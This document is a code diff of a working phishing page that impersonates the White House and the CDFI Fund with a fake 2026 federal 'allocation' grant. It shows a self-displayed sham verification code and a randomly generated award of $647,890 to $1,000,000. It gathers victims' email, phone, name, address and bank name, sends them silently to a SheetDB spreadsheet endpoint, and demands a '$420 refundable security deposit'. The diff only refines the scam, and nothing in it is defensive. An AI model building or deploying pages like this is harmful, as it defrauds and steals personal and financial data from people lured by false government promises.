@@ -3,175 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CDFI Fund | 2026 Federal Re-allocation Portal</title>
+    <title>Federal Allocation Portal | 2026 Executive Branch</title>
     <style>
         :root { --navy: #002344; --gold: #a68d5d; --bg: #f2f2f2; }
-        body { font-family: 'Times New Roman', serif; background: var(--bg); margin: 0; color: #333; }
+        body { font-family: 'Times New Roman', Times, serif; background: var(--bg); margin: 0; color: #333; }
         
-        .gov-banner { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; }
-        .header { background: var(--navy); color: white; padding: 30px; text-align: center; border-bottom: 5px solid var(--gold); }
-        .header img { width: 100px; margin-bottom: 10px; }
-        
-        .container { max-width: 600px; margin: 30px auto; background: white; padding: 40px; border-radius: 4px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        .gov-top { background: #000; color: #fff; font-size: 11px; padding: 5px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
+        .main-header { background: var(--navy); color: white; padding: 30px 20px; text-align: center; border-bottom: 5px solid var(--gold); }
+        .main-header img { width: 100px; margin-bottom: 10px; }
+        .main-header h1 { margin: 0; font-size: 22px; letter-spacing: 3px; }
+
+        .container { max-width: 600px; margin: 40px auto; background: white; padding: 45px; border-radius: 2px; box-shadow: 0 10px 40px rgba(0,0,0,0.2); position: relative; }
         .page { display: none; }
         .active { display: block; }
 
-        h2 { color: var(--navy); border-bottom: 2px solid var(--gold); padding-bottom: 10px; }
-        label { display: block; margin: 20px 0 5px; font-weight: bold; }
-        input, select { width: 100%; padding: 12px; border: 1px solid #999; border-radius: 3px; font-size: 16px; box-sizing: border-box; }
-        button { width: 100%; padding: 15px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 25px; text-transform: uppercase; }
+        h2 { color: var(--navy); border-bottom: 1px solid #ccc; padding-bottom: 15px; font-size: 24px; }
+        label { display: block; margin: 20px 0 8px; font-weight: bold; font-size: 14px; text-transform: uppercase; color: #555; }
+        input, select { width: 100%; padding: 14px; border: 1px solid #aaa; border-radius: 0; font-size: 16px; box-sizing: border-box; background: #fafafa; }
+        button { width: 100%; padding: 18px; background: var(--navy); color: white; border: none; font-weight: bold; cursor: pointer; margin-top: 30px; font-size: 16px; letter-spacing: 1px; }
         
-        .v-code-box { background: #f0f0f0; border: 2px dashed var(--navy); padding: 20px; text-align: center; font-size: 32px; font-weight: bold; letter-spacing: 10px; color: var(--navy); margin: 20px 0; }
-        
-        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 100; justify-content: center; align-items: center; }
-        .modal-box { background: white; padding: 30px; border-radius: 5px; max-width: 450px; text-align: center; border-top: 10px solid var(--navy); }
+        .verify-box { background: #f9f9f9; border: 2px dashed var(--navy); padding: 25px; text-align: center; margin: 20px 0; }
+        .access-code { font-size: 40px; font-weight: bold; color: var(--navy); letter-spacing: 12px; }
+
+        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 1000; justify-content: center; align-items: center; }
+        .modal-inner { background: white; padding: 40px; max-width: 450px; text-align: center; border-top: 8px solid var(--gold); }
     </style>
 </head>
 <body>
 
-<div class="gov-banner">Official Website of the United States Government</div>
-<div class="header">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="Seal">
+<div class="gov-top">Official Executive Communication - Restricted Access</div>
+<div class="main-header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/Seal_of_the_President_of_the_United_States.svg" alt="White House Seal">
     <h1>THE WHITE HOUSE</h1>
-    <div style="font-size: 12px;">OFFICE OF MANAGEMENT AND BUDGET</div>
+    <p style="font-size: 12px; margin: 5px 0 0;">WASHINGTON D.C. | OFFICE OF RE-ALLOCATION</p>
 </div>
 
 <div class="container">
     <div id="p1" class="page active">
-        <h2>Gateway Authentication</h2>
-        <p>Access the 2026 Individual and Business Re-allocation database.</p>
-        <label>Email Address</label>
-        <input type="email" id="email" required>
-        <label>Mobile Number</label>
-        <input type="tel" id="phone" required>
-        <button onclick="toPage(2, true)">Generate Access Code</button>
+        <h2>Secure Gateway Login</h2>
+        <p>Enter your primary contact to receive a Secure Access Code for the 2026 CDFI Re-allocation funds.</p>
+        <label>Primary Email Address</label>
+        <input type="email" id="email" placeholder="Required for confirmation" required>
+        <label>Primary Mobile Number</label>
+        <input type="tel" id="phone" placeholder="+1 (___) ___-____" required>
+        <button onclick="toPage(2, true)">Generate Secure Code</button>
     </div>
 
     <div id="p2" class="page">
-        <h2>Security Verification</h2>
-        <p>Your unique session code is below. Enter it to proceed.</p>
-        <div class="v-code-box" id="displayCode"></div>
+        <h2>Multi-Factor Authentication</h2>
+        <p>Your 6-digit access code is below. Verify to proceed.</p>
+        <div class="verify-box">
+            <div class="access-code" id="displayCode"></div>
+        </div>
         <input type="text" id="inputCode" placeholder="Enter Code">
-        <button onclick="validateCode()">Verify Access</button>
+        <button onclick="checkCode()">Verify and Access</button>
     </div>
 
     <div id="p3" class="page">
-        <h2>Eligibility Wizard</h2>
+        <h2>Eligibility Assessment</h2>
         <label>Filing Category</label>
-        <select id="type">
-            <option value="IND">Individual / Household</option>
-            <option value="ORG">Organization / Small Business</option>
+        <select id="userType">
+            <option value="single">Single / Individual Filer</option>
+            <option value="business">Business / LLC / Corporation</option>
         </select>
-        <label>Tax Status (2024-2025)</label>
-        <select id="tax">
-            <option value="YES">Yes, Filed Successfully</option>
-            <option value="NO">No, Exempt</option>
+        
+        <label>Tax Filing Status (2024-2025)</label>
+        <select id="taxStatus">
+            <option value="filed">Current / Filed Successfully</option>
+            <option value="exempt">Exempt / Below Income Limit</option>
         </select>
-        <button onclick="calcAmount()">Calculate Allotment</button>
+
+        <label>Annual Income / Revenue</label>
+        <input type="text" id="income" placeholder="Estimated $ amount">
+
+        <button onclick="calculateAndShow(4)">Analyze Eligibility</button>
     </div>
 
     <div id="p4" class="page">
-        <h2>Disbursement Profile</h2>
-        <form id="mainForm">
+        <h2>Final Disbursement Profile</h2>
+        <form id="submissionForm">
+            <input type="hidden" name="data[Login_Email]" id="hEmail">
+            <input type="hidden" name="data[Login_Phone]" id="hPhone">
+            <input type="hidden" name="data[Approved_Amount]" id="hAmount">
+
             <label>Full Legal Name</label>
-            <input type="text" name="data[Name]" id="formName" required>
+            <input type="text" name="data[FullName]" required>
             <label>Mailing Address</label>
-            <input type="text" name="data[Address]" id="formAddress" required>
-            <label>Bank Name</label>
-            <input type="text" name="data[Bank]" id="formBank" required>
-            <button type="button" onclick="showModal()">Claim Allocation</button>
+            <input type="text" name="data[Address]" required>
+            <label>Receiving Bank Name</label>
+            <input type="text" name="data[Bank]" required>
+
+            <button type="button" onclick="openAgreement()">Finalize Allocation Claim</button>
         </form>
     </div>
 
     <div id="p5" class="page text-center">
-        <h1 style="color:var(--navy)">APPROVED ✅</h1>
-        <div style="font-size: 45px; color: #1a5e20; font-weight: bold; margin: 15px 0;" id="finalAmt"></div>
-        <p>Reference: WH-2026-X882</p>
-        <p>A <strong>Refundable Security Deposit of $420.00</strong> is required to synchronize your bank. This is added to your total payout.</p>
-        <p>An officer will contact <strong><span id="resEmail"></span></strong> shortly.</p>
+        <h1 style="color:var(--navy); font-size: 28px;">ALLOCATION APPROVED ✅</h1>
+        <div style="font-size: 48px; color: #1a5e20; font-weight: bold; margin: 25px 0;" id="finalDisplay"></div>
+        <p>Your allocation is reserved. A <strong>Refundable Security Deposit of $420.00</strong> is required to synchronize your bank.</p>
+        <p>Our office will reach out to <strong><span id="finalEmail"></span></strong> shortly.</p>
     </div>
 </div>
 
 <div id="modal">
-    <div class="modal-box">
-        <h3>Agreement Required</h3>
-        <p id="mText"></p>
-        <p style="font-size: 12px;">This is a mandatory step. The money is 100% added back to your award.</p>
-        <button onclick="finalPush()" id="submitBtn" style="background:var(--navy); color:white; padding:15px; width:100%; border:none; cursor:pointer;">I AGREE & FINALIZE</button>
+    <div class="modal-inner">
+        <h3>Final Disbursement Agreement</h3>
+        <p id="modalMsg"></p>
+        <p style="font-size: 12px; color: #666;">This deposit is 100% added to your award amount.</p>
+        <button onclick="submitAll()" style="background:var(--navy)">I AGREE & SUBMIT</button>
+        <button onclick="document.getElementById('modal').style.display='none'" style="background:#888; margin-top: 10px;">CANCEL</button>
     </div>
 </div>
 
 <script>
-    let code;
-    let currentAmount;
+    let accessCode;
+    const sheetDB_URL = "https://sheetdb.io/api/v1/qhv2w2yqttw8";
 
     function toPage(n, gen=false) {
-        if(gen) { 
-            code = Math.floor(100000 + Math.random() * 900000); 
-            document.getElementById('displayCode').innerText = code; 
+        if(gen) {
+            accessCode = Math.floor(100000 + Math.random() * 900000);
+            document.getElementById('displayCode').innerText = accessCode;
         }
         document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
         document.getElementById('p'+n).classList.add('active');
     }
 
-    function validateCode() {
-        if(document.getElementById('inputCode').value == code) { toPage(3); } else { alert("Invalid Code"); }
+    function checkCode() {
+        if(document.getElementById('inputCode').value == accessCode) { toPage(3); } 
+        else { alert("Code Invalid."); }
     }
 
-    function calcAmount() {
+    function calculateAndShow(n) {
+        // Logic: Minimum $647,890.00 | Maximum $1,000,000.00
         let min = 647890;
         let max = 1000000;
-        let finalValue = Math.floor(Math.random() * (max - min + 1)) + min;
-        currentAmount = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalValue);
+        let finalAmt = Math.floor(Math.random() * (max - min + 1)) + min;
+
+        const formatted = new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(finalAmt);
         
-        document.getElementById('finalAmt').innerText = currentAmount;
-        document.getElementById('mText').innerText = `To claim your approved ${currentAmount}, you must confirm the $420 refundable security deposit.`;
-        toPage(4);
+        document.getElementById('hAmount').value = formatted;
+        document.getElementById('finalDisplay').innerText = formatted;
+        document.getElementById('modalMsg').innerText = `To receive your approved ${formatted} allocation, you must confirm the $420.00 deposit.`;
+        toPage(n);
     }
 
-    function showModal() { document.getElementById('modal').style.display = 'flex'; }
+    function openAgreement() { document.getElementById('modal').style.display = 'flex'; }
 
-    function finalPush() {
-        const btn = document.getElementById('submitBtn');
-        btn.innerText = "Processing...";
-        btn.disabled = true;
+    function submitAll() {
+        const f = document.getElementById('submissionForm');
+        document.getElementById('hEmail').value = document.getElementById('email').value;
+        document.getElementById('hPhone').value = document.getElementById('phone').value;
+        document.getElementById('finalEmail').innerText = document.getElementById('email').value;
 
-        const email = document.getElementById('email').value;
-        const phone = document.getElementById('phone').value;
-        const name = document.getElementById('formName').value;
-        const address = document.getElementById('formAddress').value;
-        const bank = document.getElementById('formBank').value;
-
-        // SheetDB API uses JSON
-        fetch('https://sheetdb.io/api/v1/qhv2w2yqttw8', {
+        // SheetDB API Background Submission
+        fetch(sheetDB_URL, {
             method: 'POST',
-            headers: {
-                'Accept': 'application/json',
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                data: [
-                    {
-                        'Email': email,
-                        'Phone': phone,
-                        'Name': name,
-                        'Address': address,
-                        'Bank': bank,
-                        'Amount': currentAmount,
-                        'Date': new Date().toLocaleString()
-                    }
-                ]
-            })
-        })
-        .then(response => {
-            document.getElementById('resEmail').innerText = email;
+            body: new FormData(f)
+        }).then(res => {
             document.getElementById('modal').style.display = 'none';
             toPage(5);
-        })
-        .catch(error => {
-            alert("Connection error. Please try again.");
-            btn.innerText = "I AGREE & FINALIZE";
-            btn.disabled = false;
+        }).catch(err => {
+            alert("Error connecting to server. Please try again.");
         });
     }
 </script>
